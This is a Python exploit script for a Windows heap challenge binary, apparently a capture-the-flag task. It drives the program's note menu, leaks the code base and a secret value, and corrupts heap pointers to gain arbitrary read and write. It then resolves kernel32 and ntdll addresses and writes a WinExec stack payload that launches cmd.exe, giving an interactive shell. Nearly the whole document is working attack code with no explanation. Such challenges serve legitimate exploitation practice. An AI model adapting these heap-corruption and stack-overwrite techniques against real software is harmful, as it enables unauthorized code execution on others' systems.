"""
    test in windows 10 pro(10.0.19041.508)
"""

from winpwn import *
ru=lambda s:p.recvuntil(s)
rl=lambda :p.recvline()
rul=lambda s:p.recvuntil(s+'\n')
sl=lambda s:p.sendline(str(s))
sd=lambda s:p.send(str(s))
rn=lambda n:p.recvn(n)
sla=lambda s1,s2:(p.recvuntil(s1),
p.sendline(str(s2))
)
sa=lambda s1,s2:(p.recvuntil(s1),
p.send(str(s2))
)
def run(ip=None,port=None):
    global p,is_debug
    if ip and port:
        is_debug=False
        p=remote(ip,port)
    elif libpath and binarypath:
        p=process(binarypath,env={'LD_PRELOAD':libpath})
    else:
        p=process(binarypath)

def debugf(s=''):
    if is_debug:
        windbgx.attach(p,s)
def menu1(i):
    ru("Command: ")
    sl(i)
def add(size,content):
    menu1(1)
    sla("Note size:",size)
    sa("Note:",content)
def delete(index):
    menu1(2)
    sla("Note index:",index)
def edit(index,content):
    menu1(3)
    sla("Note index:",index)
    sla("New note:",content)
def wenc(which=0):
    menu1(4)
    sla("[0/1]\r\n",which)
def wshow(which=0,offset=0):
    menu1(5)
    sla("[0/1]\r\n",which)
    if(which==1):
        sla("one do you want to show:",offset)
def wback():
    menu1(6)
def gshow(index):
    menu1(4)
    sla("Note index:",index)

def exp(ip=None,port=None):
    run(ip=ip,port=port)
    sla("Command: ",1)
    for i in range(8):
        add(0x98,p8(i+1)*0x98+'\n')
    for i in range(2):
        add(0x198,p8(i+0x10)*0x198+'\n')
    wenc(1)
    wenc(0)
    edit(9,'\x11'*0x198+'\x12'*7+'\n')
    edit(9,'\x11'*0x198+'\x12'*8+'\xfe\xff'+'\n')
    wshow(1,131)
    codebase = u8(p.recv(1))
    codebase = codebase << 16
    wshow(1,132)
    random1 = p.recv(1)
    random2 = p.recv(1)
    wshow(1,133)
    random3 = p.recv(1)
    random4 = p.recv(1)
    random = random1+random2+random3+random4
    random5 = u32(random)
    wback()
    # debugf("bp 401859")
    print('codebase = '+hex(codebase))
    print('random = '+hex(random5))
    sla("Command: ",2)
    sla("Secret:",p32(random5))

    add(0x10,'a'*0x10+"\n")
    add(0x10,'b'*0x10+"\n") # remove from list
    add(0x10,'c'*0x10+"\n")
    add(0x10,'d'*0x10+"\n")
    add(0x10,'cmd.exe\x00'*0x2+"\n")
    delete(1)
    delete(3)              # why need?
    gshow(1)
    ru("Note:")
    heap_addr=u32(rl().strip("\r\n").ljust(4,'\x00'))

    edit(1,p32(0x4064dc)+p32(0x4064e0))
    delete(0)
    edit(1,p32(0x004064e0)+p32(0x4)+p32(0x004064e0)+p32(0x4))
    def readFrom(where):
        edit(2,p32(where))
        gshow(1)
        ru("Note:")
        l=rl()[0:4]
        return u32(l.strip("\r\n").ljust(4,'\x00'))
    def writeTo(where,content):
        edit(2,p32(where))
        edit(1,content)
    writeTo(0x406020,0x20)

    kernel32_base=readFrom(0x404000)-0x209a0
    ntdll_base=readFrom(kernel32_base+0x81B70)-0x790a0
    pebldr=ntdll_base+0x00125d80
    # debugf()
    print(hex(pebldr))
    peb=readFrom(pebldr-0x64)-0x154
    teb=peb+0x3000 # 0xf000 -0x1ef000
    winexec=0x5cd60+kernel32_base
    # stack_addr=readFrom(teb+0x8)
    # print(hex(stack_addr))
    print(hex(teb),hex(peb))
    stack_addr=readFrom(teb)
    print(hex(teb),hex(peb))
    print(hex(stack_addr))
    ret_addr=0x40239A
    if(stack_addr==0):
        teb=peb+0xf000
        stack_addr=readFrom(teb)
    stack_addr=stack_addr+0x12c
    cmd_sh=heap_addr-0x18
    # debugf()
    payload=p32(winexec)+p32(0)+p32(cmd_sh)+p32(1)
    for i in range(4):
        writeTo(stack_addr+i*4,payload[i*4:(i+1)*4])
    print(hex(stack_addr),hex(heap_addr))
    p.interactive()
context.log_level="debug"
context.arch="i386"
context.aslr=True
p=None
libpath=None
binarypath=["./WinGame.exe"]
is_debug=True
exp()